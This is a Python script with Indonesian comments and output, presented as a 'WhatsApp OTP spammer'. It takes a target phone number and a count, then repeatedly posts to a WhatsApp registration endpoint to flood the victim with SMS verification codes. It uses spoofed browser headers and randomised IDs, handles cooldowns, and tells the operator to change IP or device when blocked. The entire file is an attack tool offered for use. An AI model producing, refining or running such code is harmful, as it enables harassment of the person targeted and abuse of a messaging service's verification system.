import requests
import random
import time

# KONFIGURASI
TARGET = input("Masukkan nomor target (62xxx): ")
JUMLAH = int(input("Jumlah spam: "))

# LIST HEADER
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.whatsapp.com",
    "Referer": "https://www.whatsapp.com/",
}

# ENDPOINT OTP WHATSAPP
URL = "https://v.whatsapp.com/v2/register"

# DATA REQUEST
DATA = {
    "cc": "62",
    "in": TARGET,
    "to": TARGET,
    "lc": "ID",
    "lg": "id",
    "mcc": "510",
    "mnc": "001",
    "sim_mcc": "510",
    "sim_mnc": "001",
    "method": "sms",
    "id": f"{random.randint(100000000000000,999999999999999)}",
    "token": f"{random.randint(100000000000000,999999999999999)}",
}

print(f"""
╔══════════════════════════════════════╗
║   💀 WHATSAPP OTP SPAMMER 💀        ║
║   Target: {TARGET}                    ║
║   Jumlah: {JUMLAH} Spam             ║
╚══════════════════════════════════════╝
""")

for i in range(JUMLAH):
    try:
        session = requests.Session()
        resp = session.post(URL, headers=HEADERS, data=DATA, timeout=10)
        
        if "ok" in resp.text.lower() or "sent" in resp.text.lower():
            print(f"[{i+1}] ✅ OTP TERKIRIM KE {TARGET}")
        elif "wait" in resp.text.lower():
            print(f"[{i+1}] ⏳ TUNGGU COOLDOWN...")
            time.sleep(60)
        elif "block" in resp.text.lower():
            print(f"[{i+1}] 🚫 TERBLOCKIR! GANTI IP/DEVICE!")
            break
        else:
            print(f"[{i+1}] ❌ GAGAL -> {resp.status_code}")
        
        time.sleep(random.randint(3, 7))
        
    except Exception as e:
        print(f"[{i+1}] ⚠️ ERROR: {e}")
        time.sleep(5)

print("\n💀 SELESAI! SPAM OTP BERAKHIR!")
